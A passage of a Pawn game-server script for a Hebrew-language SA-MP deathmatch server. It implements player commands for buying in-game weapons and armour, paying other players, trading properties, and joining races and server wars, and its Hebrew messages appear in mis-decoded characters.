			format(string,sizeof(string)," .áëãé ì÷ðåú àú äðù÷ äæä òìéê ìäéåú ìôçåú áøîä %d",Ammunation[weaponid][aLevel]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		if(GetMoney(playerid) < (WeaponCost(playerid,weaponid)*times)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú àú äðù÷ äæä");
		if(times < 1) return SendClientMessage(playerid,red," .îñôø ôòîé ÷ðééä ðîåê îãé");
		if(times > 20) return SendClientMessage(playerid,red," .îñôø ôòîé ÷ðééä âãåì îãé - î÷ñéîåí 20 ôòîéí");
		if(Ammunation[weaponid][aSlot] < 8) playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]] += times;
		playerinfo[playerid][weapons][Ammunation[weaponid][aSlot]] = Ammunation[weaponid][aID];
		GiveWeapon(playerid,Ammunation[weaponid][aID],Ammunation[weaponid][aAmmo]*times);
		GiveMoney(playerid,0-(WeaponCost(playerid,weaponid)*times));
		if(playerinfo[playerid][logged])
		{
			format(string,sizeof(string),"Weapon%d",Ammunation[weaponid][aSlot]);
			fsetint(fuser(playerid),string,Ammunation[weaponid][aID]);
			if(Ammunation[weaponid][aSlot] != 8 && Ammunation[weaponid][aSlot] != 9)
			{
				format(string,sizeof(string),"Ammo%d",Ammunation[weaponid][aSlot]);
				fsetint(fuser(playerid),string,playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]]);
			}
		}
		if(times != 1) format(string,sizeof(string)," .%s øëùú %d ôòîéí àú äðù÷",Ammunation[weaponid][aName],times);
		else format(string,sizeof(string)," .%s øëùú àú äðù÷",Ammunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/weaponlist") || equal(cmd,"/wl"))
	{
		cmd = strtok(cmdtext,idx);
		new string[M_S], menus = 0, s = sizeof(Ammunation), menuchoosen = 0;
		menus = s / 7;
		if(s % 7 > 0) menus++;
		if(!strlen(cmd))
		{
		    format(string,sizeof(string)," /wl [1-%d] :öåøú äùéîåù",menus);
			return SendClientMessage(playerid,white,string);
		}
		if(strval(cmd) < 1 || strval(cmd) > menus) return SendClientMessage(playerid,red," .úôøéè ðù÷éí ùâåé");
		format(string,sizeof(string)," ~~~ :øùéîú äðù÷éí - %d ~~~",strval(cmd));
		SendClientMessage(playerid,lightblue,string);
		SendClientMessage(playerid,brown," (WeaponID. Name (Cost, Level))");
		menuchoosen = strval(cmd) * 8 - 7;
		for(new i = menuchoosen - 1; i < menuchoosen + 8; i++)
		{
		    if(i > sizeof(Ammunation) - 1) break;
		    format(string,sizeof(string),"  %d. %s (%d$, %d)",i,Ammunation[i][aName],WeaponCost(playerid,i),Ammunation[i][aLevel]);
		    SendClientMessage(playerid,yellow,string);
		}
		return 1;
	}
	if(equal(cmd,"/resetw"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :ú÷ðåú îçé÷ú ðù÷éí ~~~");
		SendClientMessage(playerid,yellow," .òì îðú ìîðåò àé ðòéîåéåú, äòãôðå ùúáçø àí àúä áèåç ùàúä øåöä ìáöò àú äôòåìä äæå");
		SendClientMessage(playerid,yellow," /ResetW = Reset Weapons = äô÷åãä äæå, îåç÷ú àú ðù÷ééê (âí àú äúîéãééí!) = àéôåñ ðù÷éí");
		SendClientMessage(playerid,yellow," .öååú äðäìú äùøú àéðå àçøàé òì ðù÷éí ùðîç÷å");
		SendClientMessage(playerid,yellow," .äàçøàéåú òì äðù÷éí äéà òìéëí - ðù÷éí ùðîç÷å ìà éåçæøå");
		SendClientMessage(playerid,red," - ùéîå ìá: ô÷åãä æå îåç÷ú âí àú äðù÷éí äúîéãééí -");
		SendClientMessage(playerid,grey,"  áîéãä åàúä îòåðééï ìîçå÷ àú ðù÷ééê Yes áçø á");
		SendClientMessage(playerid,grey,"  òì îðú ìáèì àú äçìèúê åìà ìîçå÷ àú äðù÷éí Enter àå ìçõ No áçø á");
		ShowMenuForPlayer(areYouSure[1],playerid);
		return 1;
	}
	if(equal(cmd,"/wmenu"))
	{
		if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áçðåú äðù÷éí áëãé ìáöò ô÷åãä æå");
	    ShowPlayerDialog(playerid,dialog_ammu,DIALOG_STYLE_LIST," çðåú ðù÷éí // àôùøåéåú","÷ðä ðù÷\nöôä áøùéîú äðù÷éí\nîç÷ àú ëì ðù÷ééê\n÷ðä îâï úîéãé\n÷ðä îâï úîéãé áàîöòåú ëøèéñ àùøàé","áçø","ñâåø");
		return 1;
	}
	if(equal(cmd,"/ccbuyweapon") || equal(cmd,"/ccbw"))
	{
		new weaponid, times, string[M_S];
		if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áçðåú äðù÷éí áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .àéï ìê ëøèéñ àùøàé");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /ccbw [weapon number] [times] :öåøú äùéîåù");
		weaponid = strval(cmd);
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) times = 1;
		else times = strval(cmd);
		if(weaponid < 0 || weaponid > sizeof(Ammunation)) return SendClientMessage(playerid,red," .îñôø ðù÷ ùâåé");
		if(times < 1) return SendClientMessage(playerid,red," .îñôø ôòîé ÷ðééä ðîåê îãé");
		if(times > 20) return SendClientMessage(playerid,red," .îñôø ôòîé ÷ðééä âãåì îãé - î÷ñéîåí 20 ôòîéí");
		if(playerinfo[playerid][level] < Ammunation[weaponid][aLevel])
		{
			format(string,sizeof(string)," .áëãé ì÷ðåú àú äðù÷ äæä òìéê ìäéåú ìôçåú áøîä %d",Ammunation[weaponid][aLevel]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		if(playerinfo[playerid][bank] < (WeaponCost(playerid,weaponid)*times)) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú àú äðù÷ äæä");
		if(Ammunation[weaponid][aSlot] < 8) playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]] += times;
		playerinfo[playerid][weapons][Ammunation[weaponid][aSlot]] = Ammunation[weaponid][aID];
		GiveWeapon(playerid,Ammunation[weaponid][aID],Ammunation[weaponid][aAmmo]*times);
		playerinfo[playerid][bank] -= WeaponCost(playerid,weaponid)*times;
		if(playerinfo[playerid][logged])
		{
			format(string,sizeof(string),"Weapon%d",Ammunation[weaponid][aSlot]);
			fsetint(fuser(playerid),string,Ammunation[weaponid][aID]);
			if(Ammunation[weaponid][aSlot] != 8 && Ammunation[weaponid][aSlot] != 9)
			{
				format(string,sizeof(string),"Ammo%d",Ammunation[weaponid][aSlot]);
				fsetint(fuser(playerid),string,playerinfo[playerid][ammo][Ammunation[weaponid][aSlot]]);
			}
		}
		if(times != 1) format(string,sizeof(string)," .áòæøú ëøèéñ àùøàé %s øëùú %d ôòîéí àú äðù÷",Ammunation[weaponid][aName],times);
		else format(string,sizeof(string)," .áòæøú ëøèéñ àùøàé %s øëùú àú äðù÷",Ammunation[weaponid][aName]);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," (îñôø ôòîéí: %d) %s ÷ðéú áòæøú ëøèéñ àùøàé àú äðù÷",times,Ammunation[weaponid][aName]);
		BankLog(GetName(playerid),string,WeaponCost(playerid,weaponid)*times);
		return 1;
	}
	if(equal(cmd,"/armour"))
	{
		if(playerinfo[playerid][level] < 9) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 9");
		if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áçðåú äðù÷éí áëãé ìáöò ô÷åãä æå");
		if(GetMoney(playerid) < 100000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú îâï úîéãé, äåà òåìä 100000$");
		SetPlayerArmour2(playerid,100.0);
		GiveMoney(playerid,0-(playerinfo[playerid][vip] > 0? 100000/2:100000));
		SendClientMessage(playerid,green," .÷ðéú îâï úîéãé");
		playerinfo[playerid][armour] = 1;
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Armour",playerinfo[playerid][armour]);
		return 1;
	}
	if(equal(cmd,"/ccarmour"))
	{
		if(playerinfo[playerid][level] < 9) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 9");
		if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áçðåú äðù÷éí áëãé ìáöò ô÷åãä æå");
		if(!playerinfo[playerid][ccard]) return SendClientMessage(playerid,red," .àéï ìê ëøèéñ àùøàé");
		if(playerinfo[playerid][bank] < 100000) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú îâï úîéãé, äåà òåìä 100000$");
		SetPlayerArmour2(playerid,100.0);
		playerinfo[playerid][bank] -= playerinfo[playerid][vip] > 0? 100000/2:100000;
		SendClientMessage(playerid,green," .÷ðéú îâï úîéãé áàîöòåú ëøèéñ àùøàé");
		playerinfo[playerid][armour] = 1;
		if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Armour",playerinfo[playerid][armour]);
		BankLog(GetName(playerid)," ÷ðéú îâï úîéãé áàîöòåú ëøèéñ àùøàé",playerinfo[playerid][vip] > 0? 100000/2:100000);
		return 1;
	}
 	if(equal(cmd,"/givecash") || equal(cmd,"/pay"))
 	{
 		new id, amount, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /givecash(pay) [id/name] [amount] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /givecash(pay) [id/name] [amount] :öåøú äùéîåù");
 		amount = strval(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(id == playerid) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìáöò àú äô÷åãä äæå òì òöîê");
		if(amount < 1 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .ëîåú äòáøä ùâåéä");
		if(amount > 10000000) return SendClientMessage(playerid,red," .ðéúï ìäòáéø òã 10000000$ áëì äòáøä");
		if(!playerinfo[playerid][canp]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		SetTimerEx("CanP",15000,0,"d",playerid);
		playerinfo[playerid][canp] = 0;
		GiveMoney(playerid,0-amount);
		GiveMoney(id,amount);
		format(string,sizeof(string)," .%s ùìçú %d$ ì",GetName(id),amount);
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," .%s ÷éáìú %d$ î",GetName(playerid),amount);
		SendClientMessage(id,yellow,string);
		return 1;
	}
	if(equal(cmd,"/resetm"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :ú÷ðåú îçé÷ú ëñó ~~~");
		SendClientMessage(playerid,yellow," .òì îðú ìîðåò àé ðòéîåéåú, äòãôðå ùúáçø àí àúä áèåç ùàúä øåöä ìáöò àú äôòåìä äæå");
		SendClientMessage(playerid,yellow," /ResetM = Reset Money = äô÷åãä äæå, îåç÷ú àú ëñôê = àéôåñ ëñó");
		SendClientMessage(playerid,yellow," .öååú äðäìú äùøú àéðå àçøàé òì ëñôéí ùðîç÷å");
		SendClientMessage(playerid,yellow," .äàçøàéåú òì äëñó ùìëí äéà òìéëí - ëñó ùðîç÷ ìà éåçæø");
		SendClientMessage(playerid,grey,"  áîéãä åàúä îòåðééï ìîçå÷ àú ëñôê Yes áçø á");
		SendClientMessage(playerid,grey,"  òì îðú ìáèì àú äçìèúê åìà ìîçå÷ àú äëñó Enter àå ìçõ No áçø á");
		ShowMenuForPlayer(areYouSure[0],playerid);
		return 1;
	}
 	if(equal(cmd,"/shekel"))
 	{
 		new id, string[M_S], d[3], give[64];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /shekel [id/name] :öåøú äùéîåù");
		if((chatlocked || playerinfo[playerid][mute][0] > 0) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .ìà úåëì ìäùúîù áô÷åãä äæå áîöáê äðåëçé");
		if(!playerinfo[playerid][cans]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		getdate(d[0],d[1],d[2]);
		if(d[1] == 9 && d[2] >= 18 && d[2] <= 20) give = "úôåç áãáù";
		else if(d[1] == 12 && d[2] >= 12 && d[2] <= 20) give = "ñåôâðééä";
		else if((d[1] == 2 && d[2] >= 26 && d[2] <= 28) || (d[1] == 3 && d[2] == 1)) give = "àåæï äîï";
		else if((d[1] == 3 && d[2] >= 21 && d[2] <= 31) || (d[1] == 4 && d[2] >= 1 && d[2] <= 6)) give = "îöä";
		else give = "ù÷ì";
		if(GetMoney(playerid) < 1)
		{
			format(string,sizeof(string)," !òðé, àôéìå %s àéï ìê",give);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		GiveMoney(playerid,0-1);
		GiveMoney(id,1);
		if(d[2] >= 18 && d[2] <= 21 && d[1] == 5) format(string,sizeof(string)," .%s æø÷ áìåï îéí òì %s",GetName(id),GetName(playerid));
		else format(string,sizeof(string)," .%s ùìç %s ì %s",GetName(id),give,GetName(playerid));
		SendClientMessageToAll(lightblue,string);
		playerinfo[playerid][cans] = 0;
		SetTimerEx("CanS",30000,0,"d",playerid);
		return 1;
	}
	if(equal(cmd,"/exports"))
	{
		new string[M_S];
		if(wangv == -1) return SendClientMessage(playerid,red," .îåñê ååàðâ ìà îçôù ëøâò ùåí øëá");
		format(string,sizeof(string)," .%s îåñê ååàðâ îçôù",GetVehicleName(GetVehicleModel(wangv)));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/property"))
	{
		new string[M_S], p, f[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			format(string,sizeof(string)," /property [0-%d] :öåøú äùéîåù",props-1);
			SendClientMessage(playerid,white,string);
			return 1;
		}
		p = strval(cmd);
		if(p < 0 || p > props-1) return SendClientMessage(playerid,red," .îñôø ðëñ ùâåé");
		format(string,sizeof(string)," ~~~ :\"%s\" äðëñ ~~~",propinfo[p][pname]);
		SendClientMessage(playerid,lightblue,string);
		format(string,sizeof(string)," %d :îñôø",p);
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," %d$ :îçéø",propinfo[p][pcost]);
		SendClientMessage(playerid,yellow,string);
		format(string,sizeof(string)," %d$ :îùëåøú",propinfo[p][pearning]);
		SendClientMessage(playerid,yellow,string);
		format(f,sizeof(f),"/DM/Properties/%d.ini",p);
		format(string,sizeof(string)," %s :áòìéí ðåëçééí",fgetstring(f,"Owner"));
		SendClientMessage(playerid,yellow,string);
		return 1;
	}
	if(equal(cmd,"/buy"))
	{
		playerinfo[playerid][propertyid] = pprop(playerid);
		new f[M_S], string[M_S], p = playerinfo[playerid][propertyid];
		if(p == -1) return SendClientMessage(playerid,red," .òìéê ìäéåú áðëñ áëãé ìáöò ô÷åãä æå");
		format(f,sizeof(f),"/DM/Properties/%d.ini",p);
		if(propinfo[p][owner] == playerid) return SendClientMessage(playerid,red," .äðëñ äæä ëáø ááòìåúê");
		if(GetMoney(playerid) < propinfo[p][pcost]) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú àú äðëñ äæä");
		if(IsPlayerConnected(propinfo[p][owner]))
		{
			format(string,sizeof(string)," .%s ð÷ðä òì éãéé %s äðëñ ùìê, ä",GetName(playerid),propinfo[p][pname]);
			SendClientMessage(propinfo[p][owner],red,string);
			GiveMoney(propinfo[p][owner],propinfo[p][pcost] / 2);
		}
		propinfo[p][owner] = playerid;
		GiveMoney(playerid,0-propinfo[p][pcost]);
		fsetstring(f,"Owner",GetName(playerid));
		format(string,sizeof(string)," .%s øëùú àú ä",propinfo[p][pname]);
		SendClientMessage(playerid,green,string);
		PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/sell"))
	{
		playerinfo[playerid][propertyid] = pprop(playerid);
		new f[M_S], string[M_S], p = playerinfo[playerid][propertyid];
		if(p == -1) return SendClientMessage(playerid,red," .òìéê ìäéåú áðëñ áëãé ìáöò ô÷åãä æå");
		format(f,sizeof(f),"/DM/Properties/%d.ini",p);
		if(propinfo[p][owner] != playerid) return SendClientMessage(playerid,red," .àéðê áòì äðëñ äæä");
		propinfo[p][owner] = INVALID_PLAYER_ID;
		GiveMoney(playerid,propinfo[p][pcost]/2);
		fsetstring(f,"Owner","None");
		format(string,sizeof(string)," .%s îëøú àú ä",propinfo[p][pname]);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/earnings"))
	{
		if(playerinfo[playerid][level] < 12) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 12");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /earnings [none/normal/bank] :öåøú äùéîåù");
		if(equal(cmd,"none"))
		{
			playerinfo[playerid][earnings] = 0;
			SendClientMessage(playerid,green," .îòëùéå ìà úøååéç ëñó îäðëñéí");
		}
		else if(equal(cmd,"normal"))
		{
			playerinfo[playerid][earnings] = 1;
			SendClientMessage(playerid,green," .îòëùéå ú÷áì ëñó îäðëñéí");
		}
		else if(equal(cmd,"bank"))
		{
			playerinfo[playerid][earnings] = 2;
			SendClientMessage(playerid,green," .îòëùéå äëñó ùúøååéç îäðëñéí éåòáø ìáð÷");
		}
		else return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/racing"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /racing [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /racing state :äöâú îöá äîéøåõ äðåëçé");
			SendClientMessage(playerid,white," /racing join :äöèøôåú ìîéøåõ");
			SendClientMessage(playerid,white," /racing quit :ôøéùä îîéøåõ");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /racing start [race type] [style] :äúçìú îéøåõ çãù");
				SendClientMessage(playerid,white," /racing end [reason] :ñéåí äîéøåõ äðåëçé");
			}
			SendClientMessage(playerid,white," /racing types :äöâú ñåâé äîéøåöéí åîñôøí");
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(raceinfo[0])
			{
				new rtype[M_S];
				switch(raceinfo[4])
				{
					case race1_cars: rtype = "îëåðéåú";
					case race2_bikes: rtype = "àåôðåòéí";
					case race3_planes: rtype = "îèåñéí";
					case race4_boats: rtype = "ñéøåú";
					case race5_crazy: rtype = "îùåâò";
				}
				if(raceinfo[2] > 1) format(string,sizeof(string)," .éù îéøåõ %s åäéöéàä ìãøê úúçéì áòåã %d ùðéåú",rtype,raceinfo[2]);
				else format(string,sizeof(string)," .éù îéøåõ %s åäåà ëáø äúçéì",rtype);
				SendClientMessage(playerid,green,string);
			}
			else SendClientMessage(playerid,red," .àéï ëòú îéøåõ");
		}
		else if(equal(cmd,"join"))
		{
			if(!raceinfo[0]) return SendClientMessage(playerid,red," .àéï îéøåõ ëøâò");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áîöá");
			if(playerinfo[playerid][waitrace]) return SendClientMessage(playerid,red," .äîéøåõ éúçéì áòåã ëîä ùðéåú, àðà äîúï áñáìðåú");
			if(playerinfo[playerid][inrace]) return SendClientMessage(playerid,red," .àúä ëáø áîéøåõ");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .àúä ëáø áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áàéæåø ãé-àí");
			new raceName[32], spawns = raceinfo[4] == race4_boats? 6:8;
			if(raceinfo[1] >= spawns) return SendClientMessage(playerid,red," .ëì äî÷åîåú áîéøåõ úôåñéí");
			if(raceinfo[2] <= 1) return SendClientMessage(playerid,red," .æîï ääöèøôåú òáø");
			if(GetMoney(playerid) < 500) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîçéø ìäöèøôåú ìôòéìåú äæå äåà 500$");
			if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá");
			if(GetVehicleType(GetPlayerVehicleID(playerid)) == 5 || !IsRaceVehicle(raceinfo[4],GetPlayerVehicleID(playerid)) && raceinfo[4] != race5_crazy) return SendClientMessage(playerid,red," .ìà ðéúï ìäëðñ ìñåâ äîéøåõ äðåëçé òí äøëá äæä");
			for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerInVehicle(i,GetPlayerVehicleID(playerid)) && i != playerid) return SendClientMessage(playerid,red," .òìéê ìäéåú ìáã áøëá");
			GiveMoney(playerid,0-500);
			playerinfo[playerid][waitrace] = 1;
			playerinfo[playerid][raceid] = raceinfo[1];
			raceinfo[1]++;
			if(raceinfo[4] == race5_crazy) SendClientMessageToAll(green,CrazyRaceJoin(playerid));
			else
			{
				format(string,sizeof(string)," + !äöèøó ìîéøåõ %s",GetName(playerid));
				SendClientMessageToAll(green,string);
			}
			switch(raceinfo[4])
			{
				case race1_cars: raceName = "îéøåõ îëåðéåú";
				case race2_bikes: raceName = "îéøåõ àåôðåòéí";
				case race3_planes: raceName = "îéøåõ îèåñéí";
				case race4_boats: raceName = "îéøåõ ñéøåú";
			}
			SendClientMessage(playerid,lightblue," ~~~ :äöèøôú ìîéøåõ ~~~");
			SendClientMessage(playerid,yellow,"  îèøúê äéà ìäâéò ëîä ùéåúø îäø ì÷å äñéåí");
			SendClientMessage(playerid,yellow,"  ò÷åá àçøé äð÷åãåú äàãåîåú ùúøàä áîñìåì, òã ùúâéò ìñåôï");
			format(string,sizeof(string),"  [ùí äîéøåõ: %s [#%d",raceName,raceinfo[4]);
			SendClientMessage(playerid,pink,raceinfo[4] == race5_crazy ? ("  [#4] Crazy Race :ùí äîéøåõ") : (string));
			format(string,sizeof(string),"  äéðê îúçøä îñôø #%d",raceinfo[1]);
			SendClientMessage(playerid,pink,string);
			SendClientMessage(playerid,purple," » !áäöìçä, åîùç÷ îäðä");
		}
		else if(equal(cmd,"quit"))
		{
			if(!raceinfo[0]) return SendClientMessage(playerid,red," .àéï îéøåõ ëøâò");
			if(!playerinfo[playerid][inrace]) return SendClientMessage(playerid,red," .àúä ìà áîéøåõ");
			SendClientMessage(playerid,green," .ôøùú îäîéøåõ");
			DisablePlayerRaceCheckpoint(playerid);
			playerinfo[playerid][waitrace] = 0, playerinfo[playerid][inrace] = 0, playerinfo[playerid][raceid] = 0;
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			SetPlayerVirtualWorld(playerid,world_normal);
			SetFreeze(playerid,0);
			vehicleinfo[GetPlayerVehicleID(playerid)][racedriver] = INVALID_PLAYER_ID;
			format(string,sizeof(string),raceinfo[4] == race5_crazy ? (" - !Crazy Race-ôøù î %s") : (" - !ôøù îäîéøåõ %s"),GetName(playerid));
			SendClientMessageToAll(red,string);
			raceinfo[1]--;
			playerinfo[playerid][inact] = 0;
			if(raceinfo[1] < 3) EndRace(" çåñø ùç÷ðéí",-1);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			#endif
			if(raceinfo[0]) return SendClientMessage(playerid,red," .ëáø éù îéøåõ");
			if(ThereIsAct()) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú ôåòìú");
			cmd = strtok(cmdtext,idx);
			new rt = (!strlen(cmd)? 99:strval(cmd));
			if((rt < 0 || rt > 4) && rt != 99) return SendClientMessage(playerid,red," .ñåâ îéøåõ ùâåé");
			cmd = strtok(cmdtext,idx);
			new rs = (!strlen(cmd)? randomEx(1,4):strval(cmd));
			if(rs < 1 || rs > 3) return SendClientMessage(playerid,red," .ñèééì îéøåõ ùâåé");
			StartRace(rt,rs);
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			if(!raceinfo[0]) return SendClientMessage(playerid,red," .àéï îéøåõ ëøâò");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = " àéï";
			EndRace(reason,playerid);
		}
		else if(equal(cmd,"types"))
		{
			SendClientMessage(playerid,lightblue," ~~~ :ñåâé îéøåöéí ~~~");
			SendClientMessage(playerid,yellow," 0 - Cars - îëåðéåú");
			SendClientMessage(playerid,yellow," 1 - Bikes - àåôðåòéí");
			SendClientMessage(playerid,yellow," 2 - Planes - îèåñéí");
			SendClientMessage(playerid,yellow," 3 - Boats - ñéøåú");
			SendClientMessage(playerid,yellow," 4 - Crazy Race - îéøåõ îùåâò");
		}
		else SendClientMessage(playerid,red," .àôùøåú îéøåõ ùâåéä");
		return 1;
	}
	if(equal(cmd,"/swar"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /swar [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /swar state :äöâú îöá îìçîú äùøú äðåëçéú");
			SendClientMessage(playerid,white," /swar join :äöèøôåú ìîìçîú äùøú");
			SendClientMessage(playerid,white," /swar quit :ôøéùä îîìçîú äùøú");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /swar start [war type] [war place] :äúçìú îìçîä çãùä");
				SendClientMessage(playerid,white," /swar end [reason] :ñéåí äîìçîä äðåëçéú");
			}
			SendClientMessage(playerid,white," /swar types :øùéîú ñåâé îìçîåú ùøú");
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(warinfo[0])
			{
				if(warinfo[2] > 1)
				{
					format(string,sizeof(string)," .éù ëòú îìçîú ùøú åäéà úúçéì áòåã %d ùðéåú",warinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .éù ëòú îìçîú ùøú åäéà ëáø äúçéìä");
			}
			else SendClientMessage(playerid,red," .àéï ëòú îìçîú ùøú");
		}
		else if(equal(cmd,"join"))
		{
			if(!warinfo[0]) return SendClientMessage(playerid,red," .àéï îìçîú ùøú ëøâò");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áîöá");
			if(playerinfo[playerid][waitwar]) return SendClientMessage(playerid,red," .îìçîú äùøú úúçéì áòåã ëîä ùðéåú, àðà äîúï áñáìðåú");
			if(playerinfo[playerid][inwar]) return SendClientMessage(playerid,red," .àúä ëáø áîìçîú äùøú");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .àúä ëáø áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áàéæåø ãé-àí");
			if(warinfo[1] >= sizeof(WarPositions)-1) return SendClientMessage(playerid,red," .ëì äî÷åîåú áîìçîú äùøú úôåñéí");
			if(warinfo[2] <= 1) return SendClientMessage(playerid,red," .æîï ääöèøôåú òáø");
			if(GetMoney(playerid) < 400) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîçéø ìäöèøôåú ìôòéìåú äæå äåà 400$");
			SendClientMessage(playerid,green," .äöèøôú ìîìçîú äùøú áäöìçä, àðà äîúï ìúçéìúä");
			GiveMoney(playerid,0-400);
			playerinfo[playerid][waitwar] = 1;
			playerinfo[playerid][warid] = warinfo[1];
			warinfo[1]++;
			SendClientMessage(playerid,lightblue," ~~~ :äöèøôú ìîìçîú äùøú ~~~");
			SendClientMessage(playerid,yellow,"  îèøúê äéà ìäøåâ àú ëì äùç÷ðéí ùäöèøôå ìîìçîä");
			SendClientMessage(playerid,yellow,"  áëì ñåâ ùì îìçîä ú÷áì ñåâ ùåðä ùì ðù÷, áå úöèøê ìäùúîù òì îðú ìçñì àú ùàø äéøéáéí");
			switch(warinfo[4])
			{
				case 0: SendClientMessage(playerid,pink,"  [ñåâ äîìçîä: ðù÷ à÷øàé ìëì àçã ùç÷ï [#0");
				case 17: SendClientMessage(playerid,pink,"  [ñåâ äîìçîä: ëì äðù÷éí ùéù ìëì ùç÷ï [#17");
				default:
				{
					new wname[32];
					switch(warinfo[4])
					{
